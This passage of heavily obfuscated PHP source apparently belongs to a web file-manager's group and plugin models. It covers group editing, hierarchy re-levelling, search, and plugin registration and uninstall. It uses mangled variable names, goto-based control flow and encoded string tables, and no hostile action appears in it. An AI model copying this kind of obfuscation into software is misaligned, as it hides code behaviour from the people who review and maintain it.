$cÚÍ¿íÒ·²[$Dì¸š½µ‚[2048]], $Dì¸š½µ‚[2135] => 0, $Dì¸š½µ‚[2068] => 0); if (!empty($cÚÍ¿íÒ·²[$Dì¸š½µ‚[2064]])) { $E†ˆßÅã¯¬[$Dì¸š½µ‚[2064]] = $cÚÍ¿íÒ·²[$Dì¸š½µ‚[2064]]; } goto aòº¥ÕŞ„; bĞ¥ñá·ï‡: } protected function groupEdit($F¢Ù¦ã£, $bù¦ˆë®“) { $cÎÁ†­”†å =& $_SERVER[£ü]; if (!empty($bù¦ˆë®“[$cÎÁ†­”†å[457]])) { $CßÁ´áàªŒ = $this->getInfoSimple($F¢Ù¦ã£); $FòÇî¼©Í… = $this->getInfoSimple($bù¦ˆë®“[$cÎÁ†­”†å[457]]); if (!$CßÁ´áàªŒ || !$FòÇî¼©Í…) { return !1; } if ($CßÁ´áàªŒ[$cÎÁ†­”†å[2064]] == $FòÇî¼©Í…[$cÎÁ†­”†å[2064]]) { return !1; } if ($bù¦ˆë®“[$cÎÁ†­”†å[457]] != $CßÁ´áàªŒ[$cÎÁ†­”†å[457]]) { if ($FòÇî¼©Í…[$cÎÁ†­”†å[455]] !== $CßÁ´áàªŒ[$cÎÁ†­”†å[455]] && strpos($FòÇî¼©Í…[$cÎÁ†­”†å[455]], $CßÁ´áàªŒ[$cÎÁ†­”†å[455]] . $CßÁ´áàªŒ[$cÎÁ†­”†å[2064]] . $cÎÁ†­”†å[47]) === 0) { return !1; } $bù¦ˆë®“[$cÎÁ†­”†å[521]] = $FòÇî¼©Í…[$cÎÁ†­”†å[455]] . $bù¦ˆë®“[$cÎÁ†­”†å[457]] . $cÎÁ†­”†å[47]; $this->_changeChildLevel($CßÁ´áàªŒ, $FòÇî¼©Í…); } } if (isset($bù¦ˆë®“[$cÎÁ†­”†å[28]])) { $this->setNamePinyin($F¢Ù¦ã£, $bù¦ˆë®“[$cÎÁ†­”†å[28]]); } return $this->where(array($cÎÁ†­”†å[2136] => $F¢Ù¦ã£))->save($bù¦ˆë®“); } private function _changeChildLevel($eØ»í¹Á¾Ä, $CšÉëŠ¦Ù, $aƒ™¥ œŒî = false) { goto fÌƒ‡Å’‰; bÉ×‡Ô‰Ëå: if ($aƒ™¥ œŒî) { $b´‹ÃŞÜµ = $CšÉëŠ¦Ù[$B²ªÚùÖË’[455]] . $CšÉëŠ¦Ù[$B²ªÚùÖË’[2064]] . $B²ªÚùÖË’[47]; } $A„Êµ×ÙŠ = array($B²ªÚùÖË’[521] => array($B²ªÚùÖË’[479], $eØ»í¹Á¾Ä[$B²ªÚùÖË’[455]] . $eØ»í¹Á¾Ä[$B²ªÚùÖË’[2064]] . $B²ªÚùÖË’[480])); $F¯„Ê‹á¨ƒ = array($B²ªÚùÖË’[521] => array($B²ªÚùÖË’[530], "\162\x65\160\x6c\x61\x63\x65\x28\x70\141\x72\x65\156\164\114\145\x76\145\x6c\x2c\47{$d¤·¢¦îƒ}\x27\54\47{$b´‹ÃŞÜµ}\47\51")); goto Eèï³Ä¥; fÌƒ‡Å’‰: $B²ªÚùÖË’ =& $_SERVER[£ü]; $d¤·¢¦îƒ = $eØ»í¹Á¾Ä[$B²ªÚùÖË’[455]] . $eØ»í¹Á¾Ä[$B²ªÚùÖË’[2064]] . $B²ªÚùÖË’[47]; $b´‹ÃŞÜµ = $CšÉëŠ¦Ù[$B²ªÚùÖË’[455]] . $CšÉëŠ¦Ù[$B²ªÚùÖË’[2064]] . $B²ªÚùÖË’[47] . $eØ»í¹Á¾Ä[$B²ªÚùÖË’[2064]] . $B²ªÚùÖË’[47]; goto bÉ×‡Ô‰Ëå; Eèï³Ä¥: $this->where($A„Êµ×ÙŠ)->data($F¯„Ê‹á¨ƒ)->save(); goto c¶‚³òÓˆ; c¶‚³òÓˆ: } public function setNamePinyin($cÏÏ²¬Éò, $DàƒÕ¾“ƒç = false) { $d„¤ó«¶®† =& $_SERVER[£ü]; if (!$DàƒÕ¾“ƒç) { $d’­´â‰İñ = $this->getInfoSimple($cÏÏ²¬Éò); $DàƒÕ¾“ƒç = $d’­´â‰İñ[$d„¤ó«¶®†[28]]; } if (!Input::check($DàƒÕ¾“ƒç, $d„¤ó«¶®†[524])) { $this->metaSet($cÏÏ²¬Éò, $d„¤ó«¶®†[412], null); $this->metaSet($cÏÏ²¬Éò, $d„¤ó«¶®†[411], null); return; } $b’Òë¹È© = array($d„¤ó«¶®†[412] => str_replace($d„¤ó«¶®†[50], $d„¤ó«¶®†[33], Pinyin::encode($DàƒÕ¾“ƒç)), $d„¤ó«¶®†[411] => Pinyin::encode($DàƒÕ¾“ƒç, $d„¤ó«¶®†[525])); $this->metaSet($cÏÏ²¬Éò, $b’Òë¹È©); } protected function groupRemove($eõäí²çÎí) { goto EÇâã„„÷; FÄõÑ·—†: $this->where(array($DÛ‹©æˆ[457] => $eõäí²çÎí))->save(array($DÛ‹©æˆ[457] => $a›÷Ş£ÔÓ[$DÛ‹©æˆ[457]])); Model($DÛ‹©æˆ[2137])->where($aóÀ¹µà)->delete(); Model($DÛ‹©æˆ[2138])->where($aóÀ¹µà)->delete(); goto aáÕ¹Õ‰œÙ; aáÕ¹Õ‰œÙ: Model($DÛ‹©æˆ[748])->groupRootRemove($eõäí²çÎí); return $this->where($aóÀ¹µà)->delete(); goto føè‘‹Š’‚; BéÇò‹Ç¿å: if (!$a›÷Ş£ÔÓ || $a›÷Ş£ÔÓ[$DÛ‹©æˆ[457]] == 0) { return !1; } $EåšÎÙ˜Áº = $this->getInfoSimple($a›÷Ş£ÔÓ[$DÛ‹©æˆ[457]]); $this->_changeChildLevel($a›÷Ş£ÔÓ, $EåšÎÙ˜Áº, !0); goto FÄõÑ·—†; EÇâã„„÷: $DÛ‹©æˆ =& $_SERVER[£ü]; $aóÀ¹µà = array($DÛ‹©æˆ[2064] => $eõäí²çÎí); $a›÷Ş£ÔÓ = $this->where($aóÀ¹µà)->find(); goto BéÇò‹Ç¿å; føè‘‹Š’‚: } public function listData() { $b†„º Šš“ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($b†„º Šš“[$_SERVER[£ü][351]]); return $b†„º Šš“; } private function _makeOrder($Bè¼Á‚„ô£ = '') { goto c… ÂõÀ­„; c‡‚‰¥‚ÓÊ: $aìéƒ‚™¦ = Input::get($e„¶Ï‹‘¶ø[403], $e„¶Ï‹‘¶ø[7], $e„¶Ï‹‘¶ø[2136], $EåˆÕŠØ³); $aÉ×ùÕ˜Ïñ = Input::get($e„¶Ï‹‘¶ø[404], $e„¶Ï‹‘¶ø[7], $e„¶Ï‹‘¶ø[2139], array($e„¶Ï‹‘¶ø[2139], $e„¶Ï‹‘¶ø[400])); $aÉ×ùÕ˜Ïñ = $C‘‚ª”ïá–[$aÉ×ùÕ˜Ïñ]; goto a±…Ç¶Ü­Ï; c… ÂõÀ­„: $e„¶Ï‹‘¶ø =& $_SERVER[£ü]; $EåˆÕŠØ³ = array($e„¶Ï‹‘¶ø[2064], $e„¶Ï‹‘¶ø[28], $e„¶Ï‹‘¶ø[2050], $e„¶Ï‹‘¶ø[184]); $C‘‚ª”ïá– = array($e„¶Ï‹‘¶ø[398] => $e„¶Ï‹‘¶ø[399], $e„¶Ï‹‘¶ø[400] => $e„¶Ï‹‘¶ø[401]); goto c‡‚‰¥‚ÓÊ; a±…Ç¶Ü­Ï: $Bè¼Á‚„ô£ = $Bè¼Á‚„ô£ . "{$aìéƒ‚™¦}\x20{$aÉ×ùÕ˜Ïñ}\54\40\147\162\x6f\x75\x70\x49\x44\x20\x61\x73\x63"; return $this->order($Bè¼Á‚„ô£); goto c¸ÉêåàÃš; c¸ÉêåàÃš: } public function listChild($EÚƒ…²Ó«„) { $D§Úá˜õàô =& $_SERVER[£ü]; $AŠƒ÷™Á† = $this->where(array($D§Úá˜õàô[457] => $EÚƒ…²Ó«„))->_makeOrder()->selectPage(200); $this->_listDataApply($AŠƒ÷™Á†[$D§Úá˜õàô[351]]); return $AŠƒ÷™Á†; } public function listByID($dÕæ„¯¿ƒ‹) { $fĞßãÎñƒé =& $_SERVER[£ü]; if (!$dÕæ„¯¿ƒ‹) { return array(); } $fÚÖ¶–ƒá = array($fĞßãÎñƒé[2064] => array($fĞßãÎñƒé[7], $dÕæ„¯¿ƒ‹)); $D‘Å î‘Î = $this->where($fÚÖ¶–ƒá)->select(); $this->_listDataApply($D‘Å î‘Î); return $D‘Å î‘Î; } public function listSearch($EªñéÄ¶àó) { goto FñÌ²·¯¾¡; FñÌ²·¯¾¡: $eŠ‹­…«íÆ =& $_SERVER[£ü]; $D×Æ…áÅ½Æ = $EªñéÄ¶àó[$eŠ‹­…«íÆ[2140]]; $b«‰ºÏ¦î = isset($EªñéÄ¶àó[$eŠ‹­…«íÆ[2141]]) ? $EªñéÄ¶àó[$eŠ‹­…«íÆ[2141]] : !1; goto a’êİÜ³ƒ×; DÊÕ»ˆŸÃŒ: $Böåôçà³µ = $this->_makeOrder()->where($FÇ‹å±ğÎ¤)->selectPage(20); $Böåôçà³µ = $Böåôçà³µ ? $Böåôçà³µ : array(); if (!$Böåôçà³µ || count($Böåôçà³µ[$eŠ‹­…«íÆ[351]]) < 5 && Input::check($D×Æ…áÅ½Æ, $eŠ‹­…«íÆ[303])) { $Fí¸íÃ‡­ = $this->_searchFromMeta($eŠ‹­…«íÆ[411], $D×Æ…áÅ½Æ, 10); $Cæä’¾µ—¯ = $this->_searchFromMeta($eŠ‹­…«íÆ[412], $D×Æ…áÅ½Æ, 10); $CŒâƒÇŒÇõ = array_merge($Fí¸íÃ‡­, $Cæä’¾µ—¯, $Böåôçà³µ[$eŠ‹­…«íÆ[351]]); $Böåôçà³µ[$eŠ‹­…«íÆ[351]] = array_unique_by_key($CŒâƒÇŒÇõ, $eŠ‹­…«íÆ[2064]); $Böåôçà³µ[$eŠ‹­…«íÆ[348]][$eŠ‹­…«íÆ[349]] = count($Böåôçà³µ[$eŠ‹­…«íÆ[351]]); $Böåôçà³µ[$eŠ‹­…«íÆ[348]][$eŠ‹­…«íÆ[350]] = ceil($Böåôçà³µ[$eŠ‹­…«íÆ[348]][$eŠ‹­…«íÆ[349]] / $Böåôçà³µ[$eŠ‹­…«íÆ[348]][$eŠ‹­…«íÆ[346]]); } goto fÀ¢Â‘÷Èà; a’êİÜ³ƒ×: if (!trim($D×Æ…áÅ½Æ)) { return !1; } $D×Æ…áÅ½Æ = str_replace($eŠ‹­…«íÆ[2142], $eŠ‹­…«íÆ[2143], $D×Æ…áÅ½Æ); $FÇ‹å±ğÎ¤ = array($eŠ‹­…«íÆ[2064] => array($eŠ‹­…«íÆ[747], "\x25{$D×Æ…áÅ½Æ}\45"), $eŠ‹­…«íÆ[28] => array($eŠ‹­…«íÆ[747], "\x25{$D×Æ…áÅ½Æ}\45"), $eŠ‹­…«íÆ[904] => $eŠ‹­…«íÆ[2144]); goto DÊÕ»ˆŸÃŒ; fÀ¢Â‘÷Èà: $this->_listDataApply($Böåôçà³µ[$eŠ‹­…«íÆ[351]]); return $Böåôçà³µ; goto FãâÚ¢¾Ú; FãâÚ¢¾Ú: } private function _searchFromMeta($bÜÄ¨À÷, $B°…ŸÛ¿…ô, $Féƒ…Î˜Á) { goto c¹ñÄÁ¿‹‚; c¹ñÄÁ¿‹‚: $EºÄˆŠïã¤ =& $_SERVER[£ü]; $B°…ŸÛ¿…ô = strtolower($B°…ŸÛ¿…ô); $eÈ¾èŒè¯‘ = array($EºÄˆŠïã¤[89] => $bÜÄ¨À÷, $EºÄˆŠïã¤[356] => array($EºÄˆŠïã¤[747], "\x25{$B°…ŸÛ¿…ô}\45")); goto Aâî®Ğ‚‡; Aâî®Ğ‚‡: $cÛ§Ôèñ­Ô = Model($EºÄˆŠïã¤[2145])->where($eÈ¾èŒè¯‘)->limit($Féƒ…Î˜Á)->select(); if (!$cÛ§Ôèñ­Ô) { return array(); } $cÛ§Ôèñ­Ô = array_to_keyvalue($cÛ§Ôèñ­Ô, $EºÄˆŠïã¤[33], $EºÄˆŠïã¤[2064]); goto Féî‹‘Ş³‚; Féî‹‘Ş³‚: $d²ãƒòæ¨ = $this->where(array($EºÄˆŠïã¤[2136] => array($EºÄˆŠïã¤[7], $cÛ§Ôèñ­Ô)))->select(); if (!$d²ãƒòæ¨) { return array(); } return $d²ãƒòæ¨; goto DÕ¦‹ƒäŸ; DÕ¦‹ƒäŸ: } protected function _listDataApplyItem($Añƒ†©„ß) { $f½´ŠÔ’ß¨ = array($Añƒ†©„ß); $this->_listDataApply($f½´ŠÔ’ß¨); return $f½´ŠÔ’ß¨[0]; } protected function _listDataApply(&$AŞ…Ç¿¶Œù) { goto E„Î÷Ó¶Û; B‹¦æã‚ : $this->_listAppendParent($AŞ…Ç¿¶Œù); $this->_listAppendSourceRoot($AŞ…Ç¿¶Œù, $dã«ºÜä¿…); goto bÛß¾›”ÉÆ; eœŸ œÑæì: $this->_listAppendChildren($AŞ…Ç¿¶Œù); $this->_listAppendChildrenMember($AŞ…Ç¿¶Œù); $this->_listAppendMeta($AŞ…Ç¿¶Œù, $dã«ºÜä¿…); goto B‹¦æã‚ ; E„Î÷Ó¶Û: $fˆË¿ºôå‡ =& $_SERVER[£ü]; if (!$AŞ…Ç¿¶Œù) { return; } $dã«ºÜä¿… = array_to_keyvalue($AŞ…Ç¿¶Œù, $fˆË¿ºôå‡[33], $fˆË¿ºôå‡[2064]); goto eœŸ œÑæì; bÛß¾›”ÉÆ: } private function _listAppendChildren(&$b‡í¨¦­ÚÀ) { goto Dµ­øÔàå; F„ÜŸÄ£í: $dĞ…¿–¥ò‡ = count($b‡í¨¦­ÚÀ); $Fâ Ùğ’Â = $this->tablePrefix . $this->tableName; for ($Aô¯ùÙ‹™ = 0, $D„†š«ê– = 0; $Aô¯ùÙ‹™ < $dĞ…¿–¥ò‡; $Aô¯ùÙ‹™++) { $D„†š«ê–++; $E°ãàôÕ˜Ü = $b‡í¨¦­ÚÀ[$Aô¯ùÙ‹™][$aä®³‹½‹[2064]]; $D­„íïªŠ— .= "\x53\x45\x4c\x45\103\x54\x20\52\40\x46\x52\x4f\x4d\x20\x28\123\x45\114\x45\x43\124\x20\x27{$E°ãàôÕ˜Ü}\x5f\x63\x68\x69\154\144\47\x20\141\163\40\150\x61\x73\x20\x46\x52\117\115\x20\x60{$Fâ Ùğ’Â}\x60\40\167\x68\145\x72\145\40\160\x61\x72\145\x6e\164\111\104\x3d{$E°ãàôÕ˜Ü}\40\x6c\151\x6d\151\x74\x20\61\51\x20\141\163\x20\164\x62\137{$E°ãàôÕ˜Ü}\40\x75\156\x69\x6f\156\40\141\154\154\40"; if (($D„†š«ê– >= 20 || $Aô¯ùÙ‹™ == $dĞ…¿–¥ò‡ - 1) && $D­„íïªŠ—) { $D­„íïªŠ— = substr($D­„íïªŠ—, 0, -strlen($aä®³‹½‹[445])); $D¾âÒŸá¬Ü = $this->query($D­„íïªŠ—); $a¼à¥Ïšù = array_merge($a¼à¥Ïšù, $D¾âÒŸá¬Ü); $D„†š«ê– = 0; $D­„íïªŠ— = $aä®³‹½‹[33]; } } goto f³Üƒîã»„; f³Üƒîã»„: $a¼à¥Ïšù = array_to_keyvalue($a¼à¥Ïšù, $aä®³‹½‹[446]); foreach ($b‡í¨¦­ÚÀ as &$Cî¾–è–¹) { $Cî¾–è–¹[$aä®³‹½‹[2146]] = isset($a¼à¥Ïšù[$Cî¾–è–¹[$aä®³‹½‹[2064]] . $aä®³‹½‹[2147]]); } goto EÏˆ…¸æÔ; Dµ­øÔàå: $aä®³‹½‹ =& $_SERVER[£ü]; $D­„íïªŠ— = $aä®³‹½‹[358]; $a¼à¥Ïšù = array(); goto F„ÜŸÄ£í; EÏˆ…¸æÔ: } private function _listAppendChildrenMember(&$dÖ’à§­Š) { goto f–‹Ó¸ø´Ä; e“óîÎœËŸ: $cŞ‚éšÀˆí = array_to_keyvalue($cŞ‚éšÀˆí, $e¹‰–šÖÀŠ[446]); foreach ($dÖ’à§­Š as &$aÛ„˜«¾¹¼) { $aÛ„˜«¾¹¼[$e¹‰–šÖÀŠ[2148]] = isset($cŞ‚éšÀˆí[$aÛ„˜«¾¹¼[$e¹‰–šÖÀŠ[2064]] . $e¹‰–šÖÀŠ[2147]]); } goto Bà‚øØ™©‡; f–‹Ó¸ø´Ä: $e¹‰–šÖÀŠ =& $_SERVER[£ü]; $dİÛë¹ƒÛ = $e¹‰–šÖÀŠ[358]; $cŞ‚éšÀˆí = array(); goto e‡ÜÉæ·ÖÂ; e‡ÜÉæ·ÖÂ: $EÅÆƒ‡×Õ = count($dÖ’à§­Š); $B¦˜”ìã“ = $this->tablePrefix . $e¹‰–šÖÀŠ[2138]; for ($A‘É¹¾Âäµ = 0, $cÖÙÚ˜Úë¨ = 0; $A‘É¹¾Âäµ < $EÅÆƒ‡×Õ; $A‘É¹¾Âäµ++) { $cÖÙÚ˜Úë¨++; $fØ¦ª°×Ù© = $dÖ’à§­Š[$A‘É¹¾Âäµ][$e¹‰–šÖÀŠ[2064]]; $dİÛë¹ƒÛ .= "\x53\105\x4c\x45\103\124\x20\x2a\40\x46\122\x4f\x4d\x20\x28\123\x45\114\105\103\x54\40\47{$fØ¦ª°×Ù©}\x5f\x63\x68\x69\154\x64\47\40\x61\163\40\x68\x61\163\x20\x46\122\117\115\x20\140{$B¦˜”ìã“}\x60\40\x77\x68\145\x72\x65\x20\147\162\157\165\x70\x49\104\75{$fØ¦ª°×Ù©}\40\154\x69\x6d\x69\x74\40\61\x29\40\141\x73\40\x74\x62\x5f{$fØ¦ª°×Ù©}\40\x75\156\151\x6f\x6e\x20\x61\154\154\x20"; if (($cÖÙÚ˜Úë¨ >= 20 || $A‘É¹¾Âäµ == $EÅÆƒ‡×Õ - 1) && $dİÛë¹ƒÛ) { $dİÛë¹ƒÛ = substr($dİÛë¹ƒÛ, 0, -strlen($e¹‰–šÖÀŠ[445])); $aÔ¥„Ø¸’ä = $this->query($dİÛë¹ƒÛ); $cŞ‚éšÀˆí = array_merge($cŞ‚éšÀˆí, $aÔ¥„Ø¸’ä); $cÖÙÚ˜Úë¨ = 0; $dİÛë¹ƒÛ = $e¹‰–šÖÀŠ[33]; } } goto e“óîÎœËŸ; Bà‚øØ™©‡: } private function _listAppendMeta(&$EÊè¡ëùÑ, $f¤Í‰ëó©¢) { $FÎÎ„“÷‹º =& $_SERVER[£ü]; $e†¥Ø™£¯­ = array($FÎÎ„“÷‹º[2064] => array($FÎÎ„“÷‹º[7], $f¤Í‰ëó©¢)); $d¦Šâ•íâ‡ = Model($FÎÎ„“÷‹º[2137])->where($e†¥Ø™£¯­)->select(); $d¦Šâ•íâ‡ = array_to_keyvalue_group($d¦Šâ•íâ‡, $FÎÎ„“÷‹º[2064]); foreach ($d¦Šâ•íâ‡ as &$EÌ·»‹¤¦í) { $EÌ·»‹¤¦í = array_to_keyvalue($EÌ·»‹¤¦í, $FÎÎ„“÷‹º[89], $FÎÎ„“÷‹º[356]); } foreach ($EÊè¡ëùÑ as &$c·ë™ƒˆÃ) { $c·ë™ƒˆÃ[$FÎÎ„“÷‹º[413]] = array(); if (isset($d¦Šâ•íâ‡[$c·ë™ƒˆÃ[$FÎÎ„“÷‹º[2064]]])) { $c·ë™ƒˆÃ[$FÎÎ„“÷‹º[413]] = $d¦Šâ•íâ‡[$c·ë™ƒˆÃ[$FÎÎ„“÷‹º[2064]]]; } } } protected function parentLevelArray($bè¤šÙß»Ë) { $Bè×¯‹ÙÀ =& $_SERVER[£ü]; $bè¤šÙß»Ë = explode($Bè×¯‹ÙÀ[47], trim($bè¤šÙß»Ë, $Bè×¯‹ÙÀ[47])); $bè¤šÙß»Ë = array_remove_value($bè¤šÙß»Ë, $Bè×¯‹ÙÀ[464]); return $bè¤šÙß»Ë; } private function _listAppendParent(&$f‘¯ÉËùãñ) { goto EÕù¼Î›; A‡å×õ„™Ö: foreach ($f‘¯ÉËùãñ as &$A«ñÑÒ·òâ) { $b¼–ñÆÚí = $this->parentLevelArray($A«ñÑÒ·òâ[$D½‘£ã¶¶ˆ[455]]); $EÃƒª³íŞË = $D½‘£ã¶¶ˆ[33]; foreach ($b¼–ñÆÚí as $f ¬²‰í°æ) { $EÃƒª³íŞË .= $få…ÓË™¿[$f ¬²‰í°æ] . $D½‘£ã¶¶ˆ[8]; } if ($b¼–ñÆÚí) { $EÃƒª³íŞË .= $A«ñÑÒ·òâ[$D½‘£ã¶¶ˆ[28]]; } $A«ñÑÒ·òâ[$D½‘£ã¶¶ˆ[459]] = str_replace($D½‘£ã¶¶ˆ[463], $D½‘£ã¶¶ˆ[8], $EÃƒª³íŞË); } goto fõ»â°¤ªİ; fÀµÎÇ½ã: $DÅè‰âëĞÀ = array(); foreach ($få…ÓË™¿ as $Dƒ•Ë¦Êãè => $c‰Å¸—ôš×) { if (!$c‰Å¸—ôš×) { $DÅè‰âëĞÀ[] = $Dƒ•Ë¦Êãè; } } if ($DÅè‰âëĞÀ) { $aæÂ°¼³¤ë = array($D½‘£ã¶¶ˆ[2136] => array($D½‘£ã¶¶ˆ[381], $DÅè‰âëĞÀ)); $f‘ÅÒƒ¡· = $this->field($D½‘£ã¶¶ˆ[2149])->where($aæÂ°¼³¤ë)->select(); $A™’Åß¯êÜ = array_to_keyvalue($f‘ÅÒƒ¡·, $D½‘£ã¶¶ˆ[2064], $D½‘£ã¶¶ˆ[28]); $få…ÓË™¿ = array_merge_index($få…ÓË™¿, $A™’Åß¯êÜ); } goto A‡å×õ„™Ö; EÕù¼Î›: $D½‘£ã¶¶ˆ =& $_SERVER[£ü]; $få…ÓË™¿ = array(); foreach ($f‘¯ÉËùãñ as &$A«ñÑÒ·òâ) { $få…ÓË™¿[$A«ñÑÒ·òâ[$D½‘£ã¶¶ˆ[2064]]] = $A«ñÑÒ·òâ[$D½‘£ã¶¶ˆ[28]]; $b¼–ñÆÚí = $this->parentLevelArray($A«ñÑÒ·òâ[$D½‘£ã¶¶ˆ[455]]); foreach ($b¼–ñÆÚí as $f ¬²‰í°æ) { if (!isset($få…ÓË™¿[$f ¬²‰í°æ])) { $få…ÓË™¿[$f ¬²‰í°æ] = 0; } } } goto fÀµÎÇ½ã; fõ»â°¤ªİ: } private function _listAppendSourceRoot(&$FÓŒ±·Áğª, $C„ƒ˜¨ÏÆ–) { goto eî¸¡”®‡; Aî¾õ‹ìˆÎ: $CÏ…äæÕƒŠ = Model($CÒì…“¨„“[748])->order($CÒì…“¨„“[2151])->field($c¨‘„Ó”ŞÀ)->where($E‚©í©½¼®)->select(); $CÏ…äæÕƒŠ = array_to_keyvalue($CÏ…äæÕƒŠ, $CÒì…“¨„“[452]); $CÏ…äæÕƒŠ = array_remove_key($CÏ…äæÕƒŠ, $CÒì…“¨„“[452]); goto CŠİ’ÄªÁ; CŠİ’ÄªÁ: foreach ($FÓŒ±·Áğª as &$b”Ğ•çó) { $b”Ğ•çó[$CÒì…“¨„“[388]] = $CÏ…äæÕƒŠ[$b”Ğ•çó[$CÒì…“¨„“[2064]]] ? $CÏ…äæÕƒŠ[$b”Ğ•çó[$CÒì…“¨„“[2064]]] : array(); } goto d™ä—ˆ­°; eî¸¡”®‡: $CÒì…“¨„“ =& $_SERVER[£ü]; $E‚©í©½¼® = array($CÒì…“¨„“[368] => SourceModel::TYPE_GROUP, $CÒì…“¨„“[457] => 0, $CÒì…“¨„“[452] => array($CÒì…“¨„“[7], $C„ƒ˜¨ÏÆ–)); $c¨‘„Ó”ŞÀ = $CÒì…“¨„“[2150]; goto Aî¾õ‹ìˆÎ; d™ä—ˆ­°: } protected function resetParentLevel() { $dÏÑÖ‡Ò¥å =& $_SERVER[£ü]; $A·ô¿¹œø¿ = $dÏÑÖ‡Ò¥å[2064]; $aØ™Ç¯Ş°È = $this->select(); $aØ™Ç¯Ş°È = array_to_keyvalue($aØ™Ç¯Ş°È, $A·ô¿¹œø¿); foreach ($aØ™Ç¯Ş°È as $d­šÛİ¹Íë) { goto e®­İÄ·Å; dêÄˆåÔäÆ: $bÈ¹›‡ï¶[] = 0; $bÈ¹›‡ï¶ = $dÏÑÖ‡Ò¥å[47] . implode($dÏÑÖ‡Ò¥å[47], array_reverse($bÈ¹›‡ï¶)) . $dÏÑÖ‡Ò¥å[47]; $this->setNamePinyin($d­šÛİ¹Íë[$A·ô¿¹œø¿], $d­šÛİ¹Íë[$dÏÑÖ‡Ò¥å[28]]); goto eİ¨À¥ˆ„ò; eİ¨À¥ˆ„ò: $this->where(array($A·ô¿¹œø¿ => $d­šÛİ¹Íë[$A·ô¿¹œø¿]))->save(array($dÏÑÖ‡Ò¥å[521] => $bÈ¹›‡ï¶)); goto f±ëİ–ä†–; e®­İÄ·Å: $BÕ¥— Ø = $d­šÛİ¹Íë; $bÈ¹›‡ï¶ = array(); while ($BÕ¥— Ø[$dÏÑÖ‡Ò¥å[457]] != 0) { $bÈ¹›‡ï¶[] = $BÕ¥— Ø[$dÏÑÖ‡Ò¥å[457]]; $BÕ¥— Ø = $aØ™Ç¯Ş°È[$BÕ¥— Ø[$dÏÑÖ‡Ò¥å[457]]]; } goto dêÄˆåÔäÆ; f±ëİ–ä†–: } return $aØ™Ç¯Ş°È; } public function groupNameAuto($c»¢Èö„å, $eÍ„Çğˆâ ) { $E“ÇŞÑ“ïÎ =& $_SERVER[£ü]; $d¹„Øô¹“ = $this->where(array($E“ÇŞÑ“ïÎ[365] => $c»¢Èö„å))->getField($E“ÇŞÑ“ïÎ[28], !0); if (!$d¹„Øô¹“ || !in_array($eÍ„Çğˆâ , $d¹„Øô¹“)) { return $eÍ„Çğˆâ ; } for ($f°Ù‚Ä¬ = 1; $f°Ù‚Ä¬ <= count($d¹„Øô¹“) + 1; $f°Ù‚Ä¬++) { $aÅ‘²Ø›Õ¦ = $eÍ„Çğˆâ  . "\50{$f°Ù‚Ä¬}\x29"; if (!in_array($aÅ‘²Ø›Õ¦, $d¹„Øô¹“)) { return $aÅ‘²Ø›Õ¦; } } } } class PluginModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\x6d\56\x70\x6c\x75\x67\x69\x6e\114\x69\x73\164"; public $field = array("\156\x61\x6d\145", "\x73\164\x61\x74\165\x73", "\162\x65\147\x69\x65\x73\x74", "\143\x6f\x6e\146\151\147"); public function loadList($F…é—˜–¿æ = false) { $Aç‹šåÚÜ = array_to_keyvalue($this->listData(), $_SERVER[£ü][28]); if ($F…é—˜–¿æ) { return $Aç‹šåÚÜ[$F…é—˜–¿æ]; } return $Aç‹šåÚÜ; } public function init() { $C— Ê¯’áØ =& $_SERVER[£ü]; Hook::trigger($C— Ê¯’áØ[2152]); $Câ‘ºŞ¢¨Ë = $this->loadPluginList(); foreach ($Câ‘ºŞ¢¨Ë as $fÎ¯†•ğœÕ => $F‘Í«»ˆ¬î) { $EËñ¿¡‡äÛ = $this->appAllow($fÎ¯†•ğœÕ, $F‘Í«»ˆ¬î); if (!$EËñ¿¡‡äÛ) { continue; } foreach ($F‘Í«»ˆ¬î[$C— Ê¯’áØ[2153]] as $D•¹ËØ¬×í => $DÅñã•”¯) { Hook::bind($D•¹ËØ¬×í, $DÅñã•”¯); } } Hook::trigger($C— Ê¯’áØ[2154]); Hook::trigger(ACTION); } public function appAllow($E ÊèŠİ, $aãßŸãõø, $D´„‡÷Õ½Ï = true) { $aç¿‘èù Õ =& $_SERVER[£ü]; $FÉ’ìãÕ™‚ = PLUGIN_DIR . $E ÊèŠİ . $aç¿‘èù Õ[2155]; if (!is_array($aãßŸãõø) || !is_array($aãßŸãõø[$aç¿‘èù Õ[2153]]) || !is_file($FÉ’ìãÕ™‚) || $aãßŸãõø[$aç¿‘èù Õ[678]] != 1) { return !1; } if ($D´„‡÷Õ½Ï && !Action($aç¿‘èù Õ[2156])->checkAuth($E ÊèŠİ)) { return !1; } return !0; } public function unInstall($b›«³ÅëŞ†) { $Aó·ôÛ‘ÂÀ =& $_SERVER[£ü]; $cäŸæ±Ø = $this->loadList($b›«³ÅëŞ†); if (file_exists(PLUGIN_DIR . $b›«³ÅëŞ†)) { Hook::apply($b›«³ÅëŞ† . $Aó·ôÛ‘ÂÀ[2157]); } $this->remove($cäŸæ±Ø[$Aó·ôÛ‘ÂÀ[364]]); } public function changeStatus($aèÈãÔ”«, $CÄ¼ğˆáà) { $Dì…ç‚÷ò¿ =& $_SERVER[£ü]; $D‚ÆÊÄ‚¾Ì = $this->loadList($aèÈãÔ”«); if ($CÄ¼ğˆáà) { Hook::apply($aèÈãÔ”« . $Dì…ç‚÷ò¿[2158]); } $this->update($D‚ÆÊÄ‚¾Ì[$Dì…ç‚÷ò¿[364]], array($Dì…ç‚÷ò¿[2159] => $CÄ¼ğˆáà)); } public function appRegist($cÍî‡Ùñç, $B ·‡¿ÏÑ) { $B´ÂéÕÍÓ˜ =& $_SERVER[£ü]; $AÌğÀà‡÷ = $this->loadList($cÍî‡Ùñç); if ($AÌğÀà‡÷) { $this->update($AÌğÀà‡÷[$B´ÂéÕÍÓ˜[364]], array($B´ÂéÕÍÓ˜[2153] => $B ·‡¿ÏÑ)); } else { $aĞÄ™ˆ¼À = array($B´ÂéÕÍÓ˜[28] => $cÍî‡Ùñç, $B´ÂéÕÍÓ˜[2153] => $B ·‡¿ÏÑ, $B´ÂéÕÍÓ˜[678] => 0, $B´ÂéÕÍÓ˜[6] => $this->getConfigDefault($cÍî‡Ùñç)); $this->insert($aĞÄ™ˆ¼À); } } public function getConfigDefault($BÊğ˜ÇÙÄÛ) { $AÄÃœÔÍÇÙ =& $_SERVER[£ü]; $bÉô¼§İŸÀ = array(); $EÉ¿è‘ÙŸ = $this->getPackageJson($BÊğ˜ÇÙÄÛ); if (!$EÉ¿è‘ÙŸ && 